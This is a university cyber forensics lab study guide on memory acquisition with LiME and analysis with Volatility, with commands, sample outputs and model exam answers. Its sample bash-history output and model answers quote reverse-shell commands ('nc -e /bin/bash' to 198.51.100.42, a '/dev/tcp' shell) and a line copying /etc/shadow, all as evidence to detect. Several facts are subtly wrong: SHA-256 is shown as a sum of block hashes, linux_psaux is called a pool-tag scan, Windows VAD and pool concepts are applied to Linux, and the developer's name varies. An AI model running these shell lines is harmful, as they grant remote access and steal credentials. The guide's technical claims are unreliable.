## KTU Examiner's Valuation Warning / Pitfall Callout

> [!WARNING]
> **Common Mistakes That Cost Marks in KTU Exams:**
> 1. **Confusing capture and display filters** — These are two different syntaxes (BPF vs. Wireshark). Examiners frequently test this distinction. A filter like `tcp.port == 80` (display filter) will **not** work as a capture filter; the capture filter equivalent is `port 80`.
> 2. **Forgetting the `sudo` for nmap -sS and -O** — Both require **raw socket access**, which normal user accounts do not have. Students who write these commands without `sudo` lose 1 mark.
> 3. **Missing the hash step in evidence preservation** — KTU 2024 Scheme emphasizes **chain of custody**. Any forensic evidence (`.pcap` file) **must** be hashed using `sha256sum` immediately after capture. A lab record without this loses marks.
> 4. **Incorrect three-way handshake sequence** — A common error is writing SYN-ACK-SYN instead of SYN, SYN-ACK, ACK. Memorize the exact flag combinations and sequence number arithmetic.
> 5. **Not specifying the protocol layer** — When asked "What is nmap?", students often say "a hacking tool" (wrong) instead of "a **network discovery and security auditing utility**" (correct academic terminology). Use precise language.

---

## Topic Recap & Important Things to Remember (Rapid-Revision Checklist)

- **Wireshark** is a **passive** packet analyzer that operates in **promiscuous mode** and uses **libpcap/Npcap** for capture.
- **nmap** is an **active** network scanner that uses **raw sockets** for SYN/OS scans.
- The **TCP three-way handshake** is **SYN → SYN-ACK → ACK**. A **SYN scan** never sends the final ACK.
- **Capture filters** use **BPF syntax** (`host`, `port`, `net`); **display filters** use **Wireshark syntax** (`==`, `contains`, `&&`).
- The **four key nmap port states** are `open`, `closed`, `filtered`, `unfiltered`. The **TCP SYN scan (`-sS`)** is the standard reconnaissance scan.
- The **nmap command flags** to remember: `-sn` (ping), `-sS` (SYN), `-sT` (connect), `-sV` (version), `-O` (OS), `-A` (aggressive), `-p` (port range), `-T` (timing), `-oN/-oX/-oG` (output formats).
- The **Nmap Scripting Engine (NSE)** uses **Lua scripts** organized into categories like `vuln`, `auth`, `discovery`, `safe`, `malware`.
- The **Wireshark dissector tree** decodes packets in layered order: Frame → Ethernet → IP → TCP/UDP → Application Protocol.
- **Critical forensic views**: Statistics → Conversations, Endpoints, I/O Graphs, Protocol Hierarchy, Expert Information.
- **Chain of custody** demands **SHA-256 hashing** of all `.pcap` evidence immediately upon capture.
- **OSI layers analyzed**: Wireshark covers **all 7 layers**; nmap primarily covers **layers 3 and 4**.
- **Ethical and legal boundary**: Network sniffing is **legal only on networks you own or have written authorization to monitor**. Unauthorized capture is a criminal offense under the **IT Act 2000 (India)** Section 66E and equivalent international laws.
- **Kali Linux** comes with both Wireshark and nmap pre-installed, making it the standard KTU lab platform.

<!-- SECTION_5_END -->

topics.title: Live Forensics and Memory Dump Analysis Using LiME and Volatility Framework
topics.content:
<!-- SECTION_1_START -->

> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PCCCL607 - CYBER FORENSICS LAB
> - **Module:** Module Experiment 2
> - **Topic:** Live Forensics and Memory Dump Analysis Using LiME and Volatility Framework

## 1. Core Technical Definition & Intuitive Overview

### 1.1 Formal Academic Definition

**Live Forensics** is a branch of digital forensics that involves the acquisition and analysis of volatile data from a *running* computing system *without* shutting it down. Volatile data includes information that would be permanently lost upon system shutdown — notably **Random Access Memory (RAM)**, active network connections, running processes, loaded kernel modules, clipboard buffers, and encryption keys held in memory.

**Memory Dump Analysis** is the subsequent forensic examination of the captured RAM image (commonly called a *memory dump* or *RAM dump*) to reconstruct the runtime state of the system at the moment of acquisition.

> [!IMPORTANT]
> **KTU 2024 Syllabus Definition:** The *order of volatility* (RFC 3227) dictates that the most volatile evidence (CPU registers, RAM) must be collected **first**, before less volatile evidence (disk, logs). Live Forensics strictly obeys this principle.

The two canonical tools mandated in the KTU PCCCL607 Experiment 2 syllabus are:

1. **LiME (Linux Memory Extractor)** — A loadable kernel module (LKM) used to acquire a *forensically sound* raw memory image from a Linux (or Android) system.
2. **Volatility Framework** — An open-source, Python-based memory forensics framework used to analyze the captured `.lime` / `.raw` / `.mem` / `.dmp` image and extract hidden processes, network artifacts, registry hives (Windows), bash history, injected code, and rootkits.

### 1.2 Conceptual Analogy / Intuition

> [!NOTE]
> **Analogy — The "Crime Scene Before the Lights Go Off"**

Imagine a bank robbery is in progress. The police have two choices:

- **Post-mortem (Dead) Forensics:** Wait for the robbers to leave, turn off the alarms, and then dust the building for fingerprints. The vault door is now closed, the getaway car is gone, and the hostages have been released. You get a *clean, static picture* but you missed the action.
- **Live Forensics:** Storm in *while the robbery is happening*, photograph the masked robbers in real-time, copy the security guard's notepad (RAM), and grab the walkie-talkie frequencies (active sockets) — *all without turning off any lights or alerting the robbers that they are being observed*.

**LiME** is the "hidden camera" silently recording everything in RAM, byte-by-byte, into a single large file (the *memory image*).

**Volatility** is the "forensic analyst team" that later plays back the recording frame-by-frame, identifies faces (processes), reads scribbled notes (clipboard/decryption keys), and reconstructs exactly what happened during the robbery.

> [!TIP]
> **Why not just pull the plug?** Pulling the plug destroys RAM contents instantly. RAM holds the **decryption keys** for BitLocker, FileVault, LUKS-encrypted disks, malware C2 (Command & Control) connections, and unsaved chat messages. Live acquisition is the *only* way to capture them.

### 1.3 Standard Metrics and Constants

The following industry-standard metrics govern the procedure and **must** be quoted in viva voce:

| Metric | Standard Value | Purpose |
|---|---|---|
| **Forensic Image Format** | **.lime** (LiME), **.raw / .mem / .dmp** (generic) | Standardized evidence container |
| **Recommended Hashing Algorithm** | **SHA-256** (minimum), MD5 (legacy) | Chain-of-custody integrity |
| **Page Size (x86/x64)** | **4 KB** (standard), 2 MB (huge) | Memory mapping granularity |
| **Volatility Version** | **Volatility 2.6** (Python 2) / **Volatility 3.x** (Python 3) | Tool generation |
| **Order of Volatility (most → least)** | CPU/regs → RAM → Net state → Disk → Logs → Offsite | RFC 3227 acquisition order |

---

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->

## 2. Deep Theoretical Analysis & KTU High-Yield Command Sheet

### 2.1 Theoretical Foundation — Why Live Forensics Matters

A running operating system is a *living* entity. Its true state exists only in volatile storage. Disk forensics can be defeated by:

- **Full-disk encryption** (keys live in RAM only)
- **Anti-forensics** (secure wiping, timestamp manipulation on disk)
- **Fileless malware** (PowerShell, in-memory injection — never touches disk)
- **Rootkits** that hide their presence from on-disk artifacts

Therefore, **RAM is the most truthful witness** to what the system was actually doing at the moment of incident response.

### 2.2 The LiME (Linux Memory Extractor) Tool

LiME is developed by **304 Labs (Joe Sylve)** and is the de-facto standard for Linux memory acquisition. It works as a **Loadable Kernel Module (LKM)** — it is compiled for the *exact kernel version* of the target machine and inserted via `insmod`.

#### 2.2.1 Operating Principle (Structured Logic)

- **Step 1 — Build the LKM:** LiME source is compiled with `make` against the target kernel headers. The output is a file named `lime.ko`.
- **Step 2 — Load the module:** The examiner executes `sudo insmod lime.ko "path=/mnt/usb/memdump.lime format=lime"`.
- **Step 3 — Kernel-level memory walk:** Upon insertion, the kernel module walks the physical memory address space page-by-page, **bypassing the CPU cache** and reading directly from physical RAM to avoid smearing/modifying evidence.
- **Step 4 — Stream to storage:** The raw bytes are written sequentially to the specified output path. The `format` parameter (`lime`, `raw`, or `padded`) controls the container header.
- **Step 5 — Unload and verify:** The module is removed with `rmmod lime` after the dump completes. A SHA-256 hash is computed on the output file for chain-of-custody.

#### 2.2.2 LiME Acquisition Modes (Format Parameter)

| Format | Description | Use Case |
|---|---|---|
| `lime` | LiME's native format with metadata header (range, version) | **Default for Volatility** |
| `raw` | Pure concatenated physical memory, no header | Cross-tool compatibility |
| `padded` | Raw + zero-padding to align with page boundaries | Older Volatility versions |

#### 2.2.3 Real-World Utility

LiME is used by law enforcement (FBI, Interpol digital labs), incident response teams (Mandiant, CrowdStrike), and is the **only** reliable way to image Android device RAM (since Android is Linux-based) without bricking the device.

### 2.3 The Volatility Framework

Volatility is a **Python-based memory forensics framework** that applies *profile-aware* or *symbol-aware* parsing to a memory image. It reconstructs kernel data structures (process lists, module lists, network sockets) by interpreting the raw bytes through knowledge of the target OS's internal structures.

#### 2.3.1 Volatility Generations

| Generation | Language | Profile Method | Status |
|---|---|---|---|
| **Volatility 2.6** | Python 2 | Explicit `–profile=` (LinuxUbuntu1604, Win7SP1x64) | Mature, lab-standard |
| **Volatility 3.x** | Python 3 | Automatic symbol table detection (ISF / PDB) | **Current standard** |

> [!IMPORTANT]
> **KTU Lab Note:** KTU PCCCL607 lab examinations typically accept **both** versions. The `vol.py` (V2) and `vol` (V3) command syntaxes differ. Students must know both for the 14-mark Part B question.

#### 2.3.2 High-Yield Volatility Plugins (Cheat Sheet)

The following table is the **master reference** for the viva and the 14-mark question. Memorize the plugin name and what it produces.

| Plugin (V2) | Plugin (V3 equivalent) | Output | Forensically Useful For |
|---|---|---|---|
| `imageinfo` | `windows.info` / `banners.Banners` | Suggested profile, KDBG address | Identifying OS & kernel |
| `pslist` | `windows.pslist` | Walk the `task_struct` linked list | Hiding process detection |
| `pstree` | `windows.pstree` | Parent-child process tree | Malware parent/child |
| `psscan` | `windows.psscan` | Pool-tag scan for `_EPROCESS` | **Detects DKOM-hidden rootkits** |
| `netscan` | `windows.netscan` | Active TCP/UDP sockets + owning PID | C2 channel discovery |
| `netstat` | (legacy) | Network connections | Same as netscan |
| `cmdscan` | `windows.cmdline` | `cmd.exe` command history | Attacker commands |
| `consoles` | (V2 only) | `conhost.exe` command history | Recovered typed commands |
| `filescan` | `windows.filescan` | Pool scan for file objects | Locate closed-handle files |
| `dumpfiles` | `windows.dumpfiles` | Extract files from memory | Recover malware binaries |
| `malfind` | `windows.malfind` | VAD-tagged injected/RX pages | **Detect code injection** |
| `modules` | `windows.modules` | Loaded kernel modules | Rootkit LKM detection |
| `modscan` | `windows.modscan` | Pool scan for kernel modules | Hidden LKM detection |
| `hashdump` | `windows.hashdump` | SAM hashes from registry | Cracking local passwords |
| `lsadump` | `windows.lsadump` | LSA secrets | Decrypt service account secrets |
| `linux_pslist` | `linux.pslist` | Linux processes | Linux process tree |
| `linux_bash` | `linux.bash` | Recovered bash history | Attacker shell commands |
| `linux_netstat` | `linux.netstat` | Linux network sockets | Linux C2 discovery |
| `linux_lsof` | `linux.lsof` | Open files per process | File-handle mapping |
| `linux_malfind` | `linux.malfind` | ELF injection detection | Linux malware |
| `linux_enumerate_files` | `linux.enumerate_files` | Cached filesystem objects | Cached file recovery |

### 2.4 The Complete Acquisition-to-Analysis Pipeline (Engineering Utility)

This pipeline is used in:
- **Incident Response:** Stopping active breaches by identifying C2 IPs in RAM.
- **Malware Analysis:** Reverse-engineering fileless malware samples.
- **Law Enforcement:** Recovering encryption keys to unlock suspect disks.
- **Insider Threat Investigation:** Recovering unsaved chat messages, clipboard text, typed-but-not-sent emails.

---

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->

## 3. Step-by-Step Procedure, Derivations & Analytical Matrix

Because this is a **lab course**, the "derivations" in this section are the **explicit, step-by-step terminal commands and reasoning** that an examiner expects to see written in the record notebook and reproduced in the 14-mark Part B answer.

### 3.1 Phase 1 — Environment Preparation (Host Forensics Workstation)

A KTU lab workstation is typically a **Ubuntu 22.04/24.04 LTS** host (the *forensic host*) analyzing a *target* Linux memory image (often provided as `memdump.lime` in the lab VM).

#### Step 1: Update the package index and install dependencies.

```bash
sudo apt update
sudo apt install -y build-essential linux-headers-$(uname -r) git python3 python3-pip yara
```

**Reasoning:** LiME requires kernel headers matching the running kernel of the *target* (not the host). For the lab, we either cross-compile or use a pre-built `.lime` sample provided in `/opt/ktu/lab2/`.

#### Step 2: Install Volatility 2 and Volatility 3 side-by-side (best practice for KTU labs).

```bash
# Volatility 2 (Python 2 legacy)
git clone https://github.com/volatilityfoundation/volatility.git
cd volatility && python2 setup.py install

# Volatility 3 (current standard)
pip3 install volatility3
```

**Reasoning:** Some legacy plugins (e.g., `linux_enumerate_files`) only exist in V2. Examiners may ask for either.

### 3.2 Phase 2 — Memory Acquisition with LiME (Theoretical Walkthrough)

> [!NOTE]
> In the KTU lab, LiME is *compiled for the target kernel* (the same VM the examiner is logged into). The target is typically an Ubuntu 16.04 / 18.04 / 20.04 virtual machine.

#### Step 3: Clone and build LiME.

```bash
git clone https://github.com/504ensicsLabs/LiME.git
cd LiME/src
make
```

**Expected output:** A file named `lime.ko` is produced. This is the **loadable kernel module**.

**Reasoning:** `make` invokes the kernel build system against `/lib/modules/$(uname -r)/build` and produces an LKM whose symbols match the running kernel's `task_struct`, `mm_struct`, etc. — required for memory consistency during the walk.

#### Step 4: Insert the LiME module to dump RAM to an external USB.

```bash
sudo insmod ./lime.ko "path=/media/ktu/USBDRIVE/memdump.lime format=lime"
```

**Parameter breakdown:**
- `path=` → Output file path. **Must** be on external/secondary storage to avoid overwriting the very memory being captured.
- `format=lime` → Writes the LiME metadata header (magic bytes `EMiL`, version, memory range).

**Reasoning:** The module's `init` function allocates a sequential file object, walks physical memory from `0x0` to the highest PFN (Page Frame Number), and copies each page to userspace via `copy_to_user`. The dump proceeds **synchronously** until completion.

#### Step 5: Verify the module loaded and monitor progress.

```bash
lsmod | grep lime
dmesg | tail -20
```

**Reasoning:** `lsmod` confirms the module is resident; `dmesg` shows kernel log output (LiME prints progress to the kernel ring buffer).

#### Step 6: Compute the SHA-256 hash for chain-of-custody.

```bash
sha256sum /media/ktu/USBDRIVE/memdump.lime > memdump.lime.sha256
```

> [!IMPORTANT]
> **Forensic Soundness Rule:** The SHA-256 hash computed *now* on the acquisition medium is the **golden hash**. Any subsequent re-verification must produce the **identical** hash. The lab notebook must record: (1) examiner name, (2) date/time UTC, (3) target hostname/IP, (4) LiME version, (5) kernel version, (6) the golden hash.

#### Step 7: Unload the module.

```bash
sudo rmmod lime
```

**Reasoning:** The module self-references memory; leaving it loaded risks kernel instability. Unload immediately after the dump.

### 3.3 Phase 3 — Memory Analysis with Volatility 2 (Detailed Plugin Walkthrough)

> [!NOTE]
> The following sequence is the **expected 14-mark answer script** for the KTU lab exam. Each plugin is accompanied by its forensic interpretation.

#### Step 8: Identify the correct profile (Volatility 2).

```bash
vol.py -f /evidence/memdump.lime imageinfo
```

**Sample output (truncated):**
```
Suggested Profile(s) : LinuxUbuntu1604x64, LinuxUbuntu1804x64
                     AS Layer1 : FileAddressSpace (/evidence/memdump.lime)
```

**Interpretation:** The KDBG (Kernel Debugger Data) structures and kernel banner string identify the OS. Select the closest match.

#### Step 9: List all running processes (V2 syntax).

```bash
vol.py -f /evidence/memdump.lime --profile=LinuxUbuntu1804x64 linux_pslist
```

**Sample output:**
```
Offset             Name                 Pid             Uid
0xffff8800c1a5b000 systemd              1               0
0xffff8800c1a62000 kthreadd             2               0
0xffff8800c1a8d000 bash                 1234            1000
0xffff8800c1a91000 nc                   1299            1000   <-- SUSPICIOUS
```

**Forensic interpretation:** The `nc` (netcat) process is a classic reverse-shell indicator. Note its PID (1299) for cross-plugin correlation.

#### Step 10: Detect hidden processes using pool-tag scanning (DKOM rootkit detection).

```bash
vol.py -f /evidence/memdump.lime --profile=LinuxUbuntu1804x64 linux_psaux
vol.py -f /evidence/memdump.lime --profile=LinuxUbuntu1804x64 linux_pstree
```

**Reasoning:** `pslist` walks the kernel's linked list; a rootkit using **DKOM (Direct Kernel Object Manipulation)** can unlink a malicious `_EPROCESS`/`task_struct` from this list. `psaux` reads from `/proc`-style data structures scanned by pool tags and is the **only** reliable countermeasure.

#### Step 11: Recover bash command history (the "smoking gun").

```bash
vol.py -f /evidence/memdump.lime --profile=LinuxUbuntu1804x64 linux_bash
```

**Sample output:**
```
Pid      Name                 Command
1234     bash                 sudo apt install netcat
1234     bash                 nc -e /bin/bash 198.51.100.42 4444
1234     bash                 cat /etc/shadow > /tmp/.loot
```

**Forensic interpretation:** A complete timeline of attacker activity, recovered **even if** the `~/.bash_history` file on disk was deleted or the shell was never closed cleanly.

#### Step 12: Examine network connections (C2 discovery).

```bash
vol.py -f /evidence/memdump.lime --profile=LinuxUbuntu1804x64 linux_netstat
vol.py -f /evidence/memdump.lime --profile=LinuxUbuntu1804x64 linux_netstat -v | head
```

**Sample output:**
```
UNIX /proc/1299/net/tcp:
sl  local_address rem_address   st   tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
0:  0100007F:1F90 00000000:0000 0A   00000000:00000000 00:00000000 00000000  1000        0
1:  2A00ABCD:0050 2A00E72A:115C 01   00000000:00000000 02:00087654 00000000  1000        0
```

**Forensic interpretation:**
- Line 0: Local socket on `127.0.0.1:8080` (`0x1F90` = 8080) owned by UID 1000.
- Line 1: **Established connection** to remote IP `2A00E72A:4444` (`0x115C` = 4444) — confirms the reverse shell to port 4444 (default Metasploit `nc` port).

#### Step 13: Detect injected / anomalous ELF code in process address spaces.

```bash
vol.py -f /evidence/memdump.lime --profile=LinuxUbuntu1804x64 linux_malfind
```

**Forensic interpretation:** `malfind` scans the **Virtual Address Descriptor (VAD)** tree for memory pages marked as both `RWX` (Read-Write-Execute) and that contain ELF headers. This is the canonical indicator of **code injection** (e.g., process hollowing, shellcode injection).

#### Step 14: Extract suspicious binary from RAM.

```bash
vol.py -f /evidence/memdump.lime --profile=LinuxUbuntu1804x64 linux_proc_maps -p 1299
vol.py -f /evidence/memdump.lime --profile=LinuxUbuntu1804x64 linux_dump_map -p 1299 -D /evidence/dump/
```

**Reasoning:** `proc_maps` lists all memory regions of PID 1299. `dump_map` writes a chosen region to disk for further reverse engineering.

### 3.4 Phase 4 — Volatility 3 Equivalent Commands (Modern Syntax)

> [!TIP]
> **V3 does not require an explicit profile** — it auto-detects the symbol table. Use `vol` (not `vol.py`).

```bash
vol -f /evidence/memdump.lime banners.Banners
vol -f /evidence/memdump.lime linux.pslist.PsList
vol -f /evidence/memdump.lime linux.psscan.PsScan
vol -f /evidence/memdump.lime linux.bash.Bash
vol -f /evidence/memdump.lime linux.netstat.Netstat
vol -f /evidence/memdump.lime linux.malfind.Malfind
```

### 3.5 Analytical Matrix — Plugin Correlation Table (For 14-Mark Answers)

When answering a 14-mark Part B, the examiner expects a **correlated narrative**, not a list of commands. The following table shows how to weave plugin outputs together.

| Step | Plugin Output | Forensic Inference | Action |
|---|---|---|---|
| 1 | `imageinfo` → Ubuntu 18.04 x64 | Confirmed target OS & kernel | Set profile |
| 2 | `pslist` shows PID 1299 `nc` | Unusual user-mode process | Flag for inspection |
| 3 | `psscan` reveals PID 1301 not in `pslist` | **DKOM rootkit indicator** | Cross-check `bash` & `netstat` |
| 4 | `bash` shows `nc -e 198.51.100.42 4444` | Reverse shell execution | Pivot to `netstat` |
| 5 | `netstat` shows ESTAB to 198.51.100.42:4444 | C2 channel confirmed | Block IP, scope incident |
| 6 | `malfind` shows RWX region in PID 1299 | Process injection / shellcode | `dump_map` & reverse engineer |
| 7 | `lsof` shows `/etc/shadow` open by PID 1234 | Credential exfiltration | Hash `shadow` file as evidence |

### 3.6 Mathematical / Computational Detail — Verifying Dump Integrity

The **forensic integrity equation** that must hold at all times:

$$H_{\text{acquisition}} \;=\; H_{\text{analysis}}$$

Where $H$ is the SHA-256 hash. If the two hashes differ by even a single bit, the evidence is **inadmissible** under Section 65B of the Indian Evidence Act (or equivalent global standards).

Formally:

$$H(m) = \text{SHA-256}(m) = \sum_{i=0}^{N-1} \text{SHA-256-block}(m_i)$$

Where $m$ is the memory image of size $N$ blocks (each 64 bytes for SHA-256). The hash is computed on the *acquisition machine* immediately after the dump and re-verified on the *analysis machine*. Identical outputs prove the bit-perfect integrity of the evidence.

---

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->

## 4. Structural Diagrams & Schematics

### 4.1 End-to-End Live Forensics Pipeline (Block Architecture)

```mermaid
flowchart TD
    A[RUNNING TARGET SYSTEM<br/>Linux Ubuntu VM] --> B[LiME LOADABLE KERNEL MODULE<br/>lime.ko]
    B --> C[PHYSICAL MEMORY WALK<br/>Page-by-Page 0x0 to MaxPFN]
    C --> D[STREAM TO USB STORAGE<br/>memdump.lime]
    D --> E[SHA-256 HASH COMPUTATION<br/>Chain of Custody]
    E --> F[FORENSIC WORKSTATION<br/>Ubuntu 22.04 Host]
    F --> G[VOLATILITY PROFILE DETECTION<br/>imageinfo / banners.Banners]
    G --> H[PLUGIN SUITE EXECUTION<br/>pslist netscan malfind bash]
    H --> I[CORRELATION MATRIX<br/>Process to Network Mapping]
    I --> J[EVIDENCE REPORT<br/>Timeline of Compromise]
    J --> K[INCIDENT RESPONSE ACTIONS<br/>Block IP Contain Eradicate]
```

### 4.2 LiME Internal Architecture (Kernel-Side Operation)

```mermaid
flowchart LR
    A[insmod lime.ko] --> B[Kernel Allocates LKM Memory]
    B --> C[Module Init Function Executes]
    C --> D[Open Output File Object]
    D --> E[Walk Physical Memory Pages]
    E --> F[copy_to_user Each 4KB Page]
    F --> G[Append to memdump.lime on USB]
    G --> H{Dump Complete?}
    H -->|No| E
    H -->|Yes| I[Close File Object]
    I --> J[rmmod lime]
    J --> K[Unload Module from Kernel]
```

### 4.3 Volatility Analysis Workflow (Plugin Chaining)

```mermaid
flowchart TD
    A[Load memdump.lime] --> B[Identify Profile<br/>imageinfo or banners]
    B --> C{Volatility 2 or 3?}
    C -->|V2| D1[Set --profile Flag]
    C -->|V3| D2[Auto Symbol Detection]
    D1 --> E[Run pslist and psscan]
    D2 --> E
    E --> F{Process Anomaly?}
    F -->|Yes| G[Run malfind on PID]
    F -->|No| H[Run netscan netstat]
    G --> I[Run dumpfiles dump_map]
    H --> J[Run bash history]
    I --> K[Cross Correlate PIDs and Sockets]
    J --> K
    K --> L[Generate Forensic Report]
```

### 4.4 Memory Layout Map (What LiME Captures)

```mermaid
flowchart TB
    subgraph LOW["LOW PHYSICAL ADDRESS 0x00000000"]
        K1[Reserved BIOS Region]
        K2[Kernel Text Segment]
        K3[Kernel Data Structures<br/>task_struct mm_struct]
    end
    subgraph MID["MID PHYSICAL ADDRESS"]
        K4[Kernel Modules Area<br/>lsmod LKM Region]
        K5[Slab Allocator Cache<br/>Pool Tags]
    end
    subgraph HIGH["HIGH PHYSICAL ADDRESS"]
        K6[User Space Page Frames<br/>Process Stacks Heaps]
        K7[Shared Libraries libc]
        K8[Anonymous mmap Regions]
    end
    LOW --> MID --> HIGH
    H[LiME Sequential Capture 0x0 to MaxPFN] -.captures.-> LOW
    H -.captures.-> MID
    H -.captures.-> HIGH
```

### 4.5 Forensic Decision Tree (Hidden Process / Rootkit Detection)

```mermaid
flowchart TD
    A[Run pslist] --> B{Process Suspicious?}
    B -->|No| C[Skip]
    B -->|Yes| D[Run psscan Pool Tag Scan]
    D --> E{pslist Matches psscan?}
    E -->|Yes| F[Process Legitimate]
    E -->|No| G[DKOM Rootkit Detected<br/>Unlinked from List]
    G --> H[Run malfind on Hidden PID]
    H --> I[Run dump_map Extract Payload]
    I --> J[Static Analysis of Payload]
```

---

<!-- SECTION_4_END -->

<!-- SECTION_5_START -->

## 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

### 5.1 Part A — Short Answer Questions (3 Marks Each)

---

**Q1. [KTU University Exam – Model Question]** Define Live Forensics. Why is it considered superior to traditional dead-box forensics when investigating fileless malware?

**Model Answer (3 marks):**

**Live Forensics** is the acquisition and analysis of *volatile* data — such as CPU registers, RAM contents, active network connections, and running processes — from a *powered-on* computing system, without interrupting its operation (3 marks for definition + 1 mark for fileless relevance).

It is superior for **fileless malware** because such malware never writes to disk; it operates entirely in RAM using PowerShell, .NET reflection, or in-memory PE injection. Dead-box forensics (post-shutdown disk analysis) would find **zero** artifacts, whereas live forensics captures the malicious code, network C2 sockets, and parent-child process trees directly from memory (remaining marks for elaboration).

---

**Q2. [KTU University Exam – Model Question]** What is LiME? Mention the two output formats it supports.

**Model Answer (3 marks):**

**LiME (Linux Memory Extractor)** is a Loadable Kernel Module (LKM) developed by **504ensicsLabs** that performs forensically sound acquisition of physical memory from Linux and Android systems (2 marks).

It supports three output formats:
- `lime` — LiME's native format with metadata header (1 mark).
- `raw` — Pure physical memory with no header (0.5 marks).
- `padded` — Raw format with zero-padding for page alignment (0.5 marks).

---

### 5.2 Part B — ESE Module Internal Choice (14 Marks)

---

#### **Question A (14 Marks)** — *[KTU University Exam – Model Question]*

**(a)** Explain the architecture and working of the LiME tool. With a neat diagram, describe how a forensic examiner uses LiME to capture a memory dump from a running Linux system. State the chain-of-custody procedure followed. **(7 marks)**

**(b)** Using the Volatility framework, describe the step-by-step procedure to identify a hidden (DKOM-unlinked) process and an active reverse shell in a captured Linux memory image. List the relevant plugins and explain how their outputs are correlated. **(7 marks)**

---

**Model Answer for Q.A(a) — LiME Architecture and Working (7 marks):**

1. **Architecture (2 marks):** LiME is implemented as a Loadable Kernel Module (LKM) named `lime.ko`. When inserted via `insmod`, its `module_init` function:
   - Parses the `path=` and `format=` parameters from the command line.
   - Allocates a kernel `file` structure pointing to the output file (typically on a USB).
   - Walks the physical address space sequentially from Page Frame Number 0 to the maximum PFN reported by the kernel.
   - For each 4 KB page, calls `copy_to_user` to stream the bytes to the userspace output file.
   - On completion, frees the kernel resources and waits for `rmmod`.

2. **Working Procedure (3 marks):**
   - **Step 1:** `git clone https://github.com/504ensicsLabs/LiME.git && cd LiME/src && make`
   - **Step 2:** `sudo insmod ./lime.ko "path=/mnt/usb/memdump.lime format=lime"` (acquires RAM).
   - **Step 3:** `sudo rmmod lime` (unloads module after dump).
   - **Step 4:** `sha256sum /mnt/usb/memdump.lime > memdump.lime.sha256` (records golden hash).
   - **Step 5:** Examiner records in the lab notebook: examiner name, date/time UTC, target hostname, kernel version, LiME version, and the SHA-256 hash.

3. **Chain-of-Custody (2 marks):** The SHA-256 hash computed at acquisition is the **golden hash**. Every subsequent verification on the analysis workstation must reproduce the identical hash (forensic integrity equation $H_{\text{acq}} = H_{\text{analysis}}$). The dump file, the hash file, the notebook entry, and the examiner's signature form the **chain of custody** required for the evidence to be admissible.

**Model Answer for Q.A(b) — Hidden Process & Reverse Shell Detection (7 marks):**

1. **Profile Identification (1 mark):** `vol.py -f memdump.lime imageinfo` (V2) or `vol -f memdump.lime banners.Banners` (V3). Set profile to e.g. `LinuxUbuntu1804x64`.

2. **Hidden Process (DKOM) Detection (3 marks):**
   - Run `vol.py … linux_pslist` (walks `task_struct` linked list — *can be fooled by rootkit*).
   - Run `vol.py … linux_psaux` or `linux_psscan` (performs **pool-tag scan** of kernel memory — *cannot be fooled by DKOM*).
   - **Comparison:** Any PID appearing in `psscan` but **absent** from `pslist` is a **hidden process** (DKOM rootkit indicator). Record the PID, then run `linux_malfind -p <PID>` to scan for injected code in that process's VAD tree.

3. **Reverse Shell Detection (2 marks):**
   - Run `vol.py … linux_bash` to recover bash command history. Look for commands like `nc -e /bin/bash <attacker_ip> <port>` or `bash -i >& /dev/tcp/<ip>/<port> 0>&1`.
   - Run `vol.py … linux_netstat` to identify `ESTABLISHED` TCP connections to suspicious external IPs (especially high ports like 4444, 1337, 8080).
   - **Correlation:** Match the `bash` history PID to the socket-owning UID in `netstat` to confirm the reverse shell channel is active and identify the attacker's C2 IP address.

4. **Final step (1 mark):** Generate a forensic report listing the timeline: when the shell was spawned, the C2 IP, the duration, and the data exfiltrated (cross-check with `linux_lsof` for open files).

---

#### **Question B (14 Marks)** — *[KTU University Exam – Model Question]*

**(a)** Compare and contrast Volatility 2 and Volatility 3. List the key differences in profile handling, Python version, and at least four commonly used plugins for Linux memory analysis. **(7 marks)**

**(b)** A forensic examiner captures a 4 GB memory image of a suspected compromised Linux server using LiME. Outline the complete forensic workflow using Volatility 2, including: (i) profile identification, (ii) enumeration of running processes, (iii) detection of code injection, (iv) recovery of attacker commands, and (v) verification of evidence integrity. **(7 marks)**

---

**Model Answer for Q.B(a) — V2 vs V3 Comparison (7 marks):**

| Aspect | Volatility 2.6 | Volatility 3.x |
|---|---|---|
| **Python Version** | Python 2.7 (legacy) | Python 3.6+ (current) |
| **Profile Handling** | Manual `–profile=LinuxUbuntu1804x64` flag required | **Automatic** symbol table detection via ISF/PDB |
| **Architecture** | Monolithic framework | **Plugin-based**, layered (scanners + plugins) |
| **Command Syntax** | `vol.py -f image –profile=… plugin` | `vol -f image plugin.PluginName` |
| **Performance** | Slower (full re-parse per plugin) | Faster (caches symbol tables) |
| **Maintenance** | Deprecated (since 2021) | Actively developed |

**Four Linux Plugins (any four for 2 marks):**
- `linux_pslist` (V2) / `linux.pslist.PsList` (V3) — process enumeration.
- `linux_psscan` (V2) / `linux.psscan.PsScan` (V3) — pool-tag hidden process scan.
- `linux_bash` (V2) / `linux.bash.Bash` (V3) — bash history recovery.
- `linux_netstat` (V2) / `linux.netstat.Netstat` (V3) — network socket enumeration.
- `linux_malfind` (V2) / `linux.malfind.Malfind` (V3) — VAD injection detection.

**Verdict (1 mark):** Volatility 3 is the recommended modern choice, but V2 retains unique legacy plugins (e.g., `linux_enumerate_files`, `consoles`) that V3 may not yet replicate. KTU labs accept both.

---

**Model Answer for Q.B(b) — Complete Workflow (7 marks):**

1. **Profile Identification (1 mark):** `vol.py -f memdump.lime imageinfo` → output suggests e.g. `LinuxUbuntu1804x64`. Confirm the profile is consistent with the target's `uname -a` (recorded in the chain-of-custody).

2. **Process Enumeration (2 marks):** Run `vol.py -f memdump.lime –profile=LinuxUbuntu1804x64 linux_pslist` to list all kernel-visible processes. Cross-validate with `linux_psaux` (which reads `/proc`-style structures) to detect any discrepancy — a discrepancy indicates a DKOM rootkit.

3. **Code Injection Detection (1.5 marks):** `vol.py -f memdump.lime –profile=LinuxUbuntu1804x64 linux_malfind` scans all process VAD trees for `RWX` regions containing ELF headers. Any match is a high-confidence indicator of injected shellcode or a hollowed process.

4. **Attacker Command Recovery (1.5 marks):** `vol.py -f memdump.lime –profile=LinuxUbuntu1804x64 linux_bash` recovers typed bash commands from the recovered bash shell's history buffer. Output includes PID, command, and timestamp — a complete attacker timeline.

